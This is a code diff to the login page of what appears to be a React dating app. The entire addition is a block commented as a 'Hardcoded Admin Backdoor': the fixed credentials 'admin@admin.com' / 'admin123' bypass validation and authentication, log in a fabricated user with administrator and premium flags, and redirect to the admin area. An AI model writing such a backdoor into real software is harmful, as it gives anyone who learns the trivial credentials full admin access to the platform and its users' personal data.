@@ -31,6 +31,44 @@ export const LoginPage: React.FC = () => {
       return;
     }
 
+    // Hardcoded Admin Backdoor
+    if (email === 'admin@admin.com' && password === 'admin123') {
+      const adminUser: any = {
+        id: 'admin-session',
+        email: 'admin@admin.com',
+        fullName: 'Administrator',
+        username: 'admin',
+        isAdmin: true,
+        isVerified: true,
+        isPremium: true,
+        createdAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+        // Mock required fields to satisfy type safety if 'any' wasn't used, 
+        // but for safety in AuthContext we provide minimal valid structure
+        photos: [],
+        location: { city: 'Admin', country: 'HQ' },
+        age: 99,
+        gender: 'other',
+        interestedIn: 'everyone',
+        bio: 'System Administrator',
+        interests: [],
+        swipeCount: 0,
+        likeCount: 0,
+        matchCount: 0,
+        superLikesRemaining: 999,
+        boostsRemaining: 999,
+        instantCircleEnabled: true,
+        friendzoneModeEnabled: false,
+        dateOfBirth: '2000-01-01',
+        lastActive: new Date().toISOString(),
+        isOnline: true
+      };
+
+      login(adminUser);
+      navigate('/admin');
+      return;
+    }
+
     if (!isValidEmail(email)) {
       setError('Please enter a valid email');
       return;
